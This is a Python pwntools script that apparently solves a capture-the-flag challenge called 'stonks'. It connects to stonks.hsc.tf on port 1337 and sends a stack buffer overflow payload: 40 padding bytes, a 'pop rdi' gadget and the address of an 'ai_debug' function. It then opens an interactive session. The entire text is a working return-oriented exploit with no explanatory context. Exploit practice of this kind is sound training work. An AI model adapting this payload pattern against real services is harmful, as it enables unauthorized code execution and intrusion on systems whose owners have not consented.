from pwn import *
DEBUG = False
p = None
context( os="linux", arch="amd64" )
if DEBUG:
    p = process( "./chal" )
else:
    p = remote( "stonks.hsc.tf", 1337 )
print( "--> Running Debug: ", DEBUG )
ai_debug = 0x0000000000401258
pop_rdi = 0x0000000000401363
junk = b'A' * 32 + b'B' * 8
payload = junk + p64( pop_rdi ) + p64( ai_debug )
p.sendline( payload )
p.interactive()
